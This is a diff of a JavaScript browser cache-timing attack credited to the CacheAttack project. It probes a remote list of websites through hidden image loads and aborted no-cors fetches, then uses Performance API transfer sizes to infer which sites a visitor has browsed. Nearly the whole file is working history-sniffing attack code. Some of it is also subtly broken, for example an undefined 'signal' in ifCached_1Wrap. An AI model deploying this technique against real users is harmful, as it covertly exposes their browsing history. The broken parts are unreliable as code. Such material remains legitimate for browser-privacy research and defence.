@@ -1,7 +1,7 @@
 // NDev 2020 https://github.com/NDevTK/CacheAttack
-max = 10;
+const max = 10;
 
-ifCached = (navigator.userAgent.includes("Firefox")) ? ifCached_1 : ifCached_2;
+ifCached = (navigator.userAgent.includes("Firefox")) ? ifCached_1Wrap : ifCached_2;
 
 async function getRules() {
     let req = await fetch("https://cache.ndev.tk/rules");
@@ -14,53 +14,61 @@ async function pushContent(content) {
 }
 
 function is304(res) {
-  if (res.encodedBodySize > 0 &&
-      res.transferSize > 0 &&
-      res.transferSize < res.encodedBodySize) {
-    return true;
-  }
-  return null;
+    if (res.encodedBodySize > 0 &&
+        res.transferSize > 0 &&
+        res.transferSize < res.encodedBodySize) {
+        return true;
+    }
+    return null;
 }
 
 function PerformanceCheck(url) {
-  var res = performance.getEntriesByName(url).pop();
-  if(res === undefined) return null
-  if(is304(res)) return true;
-  return (res.transferSize === 0);
+    var res = performance.getEntriesByName(url).pop();
+    if(res === undefined) return null
+    if(is304(res)) return true;
+    return (res.transferSize === 0);
 }
 
-async function getWebsites(callback) {
+async function getWebsites(callback, CacheTest = true) {
     (callback) ? callback : pushContent;
-    Websites = await getRules();
-    await ifCached_test();
-    result = [];
+    var Websites = await getRules();
+    if(CacheTest) {
+        let TestResult = await ifCached_test();
+        if(!TestResult) throw "Cache is not working :-("
+    }
+    var result = [];
     // Foreach website check if cached
     for (let website of Websites) {
-        await ifCached(website[0]).then(_ => {
-		var check = PerformanceCheck(website[0]);
-		if(check === true || check === null) {
-			callback(website[1])
+        let result = await ifCached(website[0]);
+		let check = PerformanceCheck(website[0]);
+		if(check || result && check === null) {
+			callback(website[1]);
 		}
-	}).catch(_ => {
-		if(PerformanceCheck(website[0])) {
-			callback(website[1])
-		}
-	});
-    }
+	}
     return result;
 };
 
 async function ifCached_test() {
     let cache_test = "https://ndev.tk/README.md?".concat(Math.random());
-    await ifCached(cache_test).catch(_ => {});
-    ifCached(cache_test).then(_ => {throw "Timeout"});
+    await ifCached(cache_test);
+    let result = await ifCached(cache_test);
+    return result;
+}
+
+async function ifCached_1Wrap(url) {
+    try {
+        await fetch(url, {mode: "no-cors", signal});
+    } catch(err) {
+        return false
+    }
+    return true
 }
 
 function ifCached_1(url) {
     return new Promise((resolve, reject) => {
         let img = new Image(0, 0);
         img.hidden = true;
-	img.onerror = _ => resolve();
+        img.onerror = _ => resolve();
         img.onload = _ => resolve();
         img.src = url;
         setTimeout(_ => {
@@ -72,13 +80,16 @@ function ifCached_1(url) {
 }
 
 async function ifCached_2(url){
+    var state = true;
     var controller = new AbortController();
     var signal = controller.signal;
     let timeout = await setTimeout(_ => { // Stop request after max
         controller.abort();
-        throw "Timeout";
+        state = false;
     }, max);
-    await fetch(url, {mode: "no-cors", signal});
+    try {
+        await fetch(url, {mode: "no-cors", signal});
+    } catch(err) {}
     clearTimeout(timeout);
-    return;
+    return state;
 }
